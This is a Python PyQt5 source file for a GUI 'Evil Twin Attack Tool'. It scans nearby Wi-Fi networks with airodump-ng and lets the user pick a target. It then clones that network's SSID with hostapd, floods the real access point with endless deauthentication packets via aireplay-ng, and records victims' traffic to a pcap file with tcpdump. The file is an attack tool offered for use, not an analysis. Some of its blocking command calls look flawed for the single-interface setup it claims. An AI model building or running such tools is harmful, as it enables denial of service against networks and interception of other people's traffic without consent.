from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
import subprocess
import sys
import os
import time
import pexpect  # For handling sudo password prompts

class EvilTwinTool(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Evil Twin Attack Tool (Single Interface)")
        self.setGeometry(300, 300, 600, 500)
        
        # Variables
        self.target_ssid = ""
        self.target_bssid = ""
        self.target_channel = ""
        self.sudo_password = ""
        
        # UI Elements
        self.password_label = QLabel("Enter Sudo Password:", self)
        self.password_label.move(50, 20)
        
        self.password_input = QLineEdit(self)
        self.password_input.setEchoMode(QLineEdit.Password)
        self.password_input.move(200, 20)
        self.password_input.resize(150, 25)
        
        self.scan_button = QPushButton("Scan Networks", self)
        self.scan_button.move(50, 60)
        self.scan_button.clicked.connect(self.scan_networks)
        
        self.network_list = QComboBox(self)
        self.network_list.move(200, 60)
        self.network_list.resize(200, 25)
        
        self.select_button = QPushButton("Select Target", self)
        self.select_button.move(420, 60)
        self.select_button.clicked.connect(self.select_target)
        
        self.attack_button = QPushButton("Launch Attack", self)
        self.attack_button.move(200, 100)
        self.attack_button.clicked.connect(self.launch_attack)
        
        self.stop_button = QPushButton("Stop Attack", self)
        self.stop_button.move(320, 100)
        self.stop_button.clicked.connect(self.stop_attack)
        self.stop_button.setEnabled(False)
        
        self.console = QPlainTextEdit(self)
        self.console.move(50, 150)
        self.console.resize(500, 300)
    
    def run_cmd(self, command, needs_password=False):
        """Run a shell command, handling sudo prompts if needed."""
        try:
            if needs_password and self.sudo_password:
                child = pexpect.spawn(command)
                child.expect('[Pp]assword:')
                child.sendline(self.sudo_password)
                child.expect(pexpect.EOF)
                output = child.before.decode('utf-8')
            else:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8')
            return output
        except Exception as e:
            self.console.appendPlainText(f"[-] Error: {str(e)}")
            return ""
    
    def scan_networks(self):
        self.sudo_password = self.password_input.text()
        if not self.sudo_password:
            self.console.appendPlainText("[-] Enter sudo password first!")
            return
        
        self.console.appendPlainText("[+] Putting wlan0 into monitor mode...")
        self.run_cmd("sudo airmon-ng check kill", needs_password=True)
        self.run_cmd("sudo airmon-ng start wlan0", needs_password=True)
        
        self.console.appendPlainText("[+] Scanning for networks... (Wait 10 sec)")
        self.run_cmd("sudo timeout 10 airodump-ng wlan0mon -w scan --output-format csv", needs_password=True)
        
        try:
            with open('scan-01.csv', 'r') as f:
                lines = f.readlines()
                self.network_list.clear()
                for line in lines[1:]:  # Skip header
                    parts = line.split(',')
                    if len(parts) > 13:
                        ssid = parts[13].strip().strip('"')
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        if ssid:  # Skip empty SSIDs
                            self.network_list.addItem(f"{ssid} {bssid} (CH {channel})")
            self.console.appendPlainText("[+] Scan complete. Select a target.")
        except Exception as e:
            self.console.appendPlainText(f"[-] Error parsing scan: {str(e)}")
    
    def select_target(self):
        selected = self.network_list.currentText()
        if selected:
            parts = selected.split()
            self.target_ssid = ' '.join(parts[:-4])  # Handle SSIDs with spaces
            self.target_bssid = parts[-3]
            self.target_channel = parts[-1].strip('()CH')
            self.console.appendPlainText(f"[+] Target: {self.target_ssid} (CH:{self.target_channel})")
    
    def launch_attack(self):
        if not self.target_ssid:
            self.console.appendPlainText("[-] Select a target first!")
            return
        
        self.console.appendPlainText("[+] Stopping monitor mode...")
        self.run_cmd("sudo airmon-ng stop wlan0mon", needs_password=True)
        
        self.console.appendPlainText("[+] Setting up Evil Twin...")
        with open('/tmp/hostapd.conf', 'w') as f:
            f.write(f"""
interface=wlan0
driver=nl80211
ssid={self.target_ssid}
hw_mode=g
channel={self.target_channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
""")
        # Start Hostapd (AP mode)
        self.run_cmd(f"sudo hostapd /tmp/hostapd.conf", needs_password=True)
        time.sleep(2)
        
        # Start deauth in monitor mode
        self.run_cmd("sudo airmon-ng start wlan0", needs_password=True)
        self.run_cmd(f"sudo aireplay-ng --deauth 0 -a {self.target_bssid} wlan0mon", needs_password=True)
        
        # Start capturing traffic
        self.run_cmd("sudo tcpdump -i wlan0 -w victims.pcap", needs_password=True)
        
        self.console.appendPlainText("[!] Attack running. Check terminal windows.")
        self.attack_button.setEnabled(False)
        self.stop_button.setEnabled(True)
    
    def stop_attack(self):
        self.console.appendPlainText("[+] Stopping attack...")
        self.run_cmd("sudo pkill hostapd", needs_password=True)
        self.run_cmd("sudo pkill aireplay-ng", needs_password=True)
        self.run_cmd("sudo pkill tcpdump", needs_password=True)
        self.run_cmd("sudo airmon-ng stop wlan0mon", needs_password=True)
        self.console.appendPlainText("[+] Attack stopped.")
        self.attack_button.setEnabled(True)
        self.stop_button.setEnabled(False)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = EvilTwinTool()
    window.show()
    sys.exit(app.exec_())
